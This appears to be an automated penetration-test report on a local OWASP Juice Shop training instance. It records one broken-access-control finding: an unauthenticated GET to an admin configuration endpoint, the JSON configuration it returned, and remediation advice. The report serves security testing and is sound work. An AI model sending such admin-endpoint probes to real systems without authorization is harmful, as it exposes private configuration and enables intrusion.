# Nightfall — Penetration Test Report

**Target:** http://localhost:3000/
**Objective:** Reach the admin dashboard
**Date:** 2026-11-12
**Run:** run `59c9d590-2099-4cd8-859c-3dc12d83fbfe` · stopped: objective · model spend: $0.0000

## Summary

1 finding — 1 high.

## Findings

### 1. Broken Access Control at http://localhost:3000/ — HIGH (CVSS 7.5)

- **Severity:** high
- **CVSS vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

**Evidence**

```http
GET http://localhost:3000/rest/admin/application-configuration
```

```
{"config":{"server":{"port":3000,"basePath":"","baseUrl":"http://localhost:3000"},"application":{"domain":"juice-sh.op","name":"OWASP Juice Shop","logo":"JuiceShop_Logo.png","favicon":"favicon_js.ico","theme":"bluegrey-lightgreen","showVersionNumber":true,"showGitHubLinks":true,"localBackupEnabled":true,"numberOfRandomFakeUsers":0,"altcoinName":"Juicycoin","privacyContactEmail":"donotreply@owasp-juice.shop","customMetricsPrefix":"juiceshop","chatBot":{"name":"Juicy the Smart Assistant","avatar":"JuicyChatBot.png","model":"gemma4:e4b","llmMaxRetries":2,"sampleQuestions":["CHATBOT_PROMPT_RECOMMENDATION_SUMMER_PARTY","CHATBOT_PROMPT_RECOMMENDATION_POPULAR","CHATBOT_PROMPT_RECOMMENDATION_SUGAR_FREE","CHATBOT_PROMPT_RECOMMENDATION_START_DAY","CHATBOT_PROMPT_RECOMMENDATION_SEASONAL"]},"social":{"blueSkyUrl":"https://bsky.app/profile/owasp-juice.shop","mastodonUrl":"https://fosstodon.org/@owasp_juiceshop","twitterUrl":"https://twitter.com/owasp_juiceshop","facebookUrl":"https://www.facebook.com/owasp.juiceshop","slackUrl":"https://owasp.org/slack/invite","redditUrl":"https://www.reddit.com/r/owasp_juiceshop","pressKitUrl":"https://github.com/OWASP/owasp-swag/tree/master/projects/juice-sho
… [800 more bytes truncated]
```

_access-probe: reached objective signal [admin] at 200_

**Remediation**

Enforce server-side authorization on every request against the authenticated principal, deny by default, and never rely on unlinked or obscure URLs for protection.

---
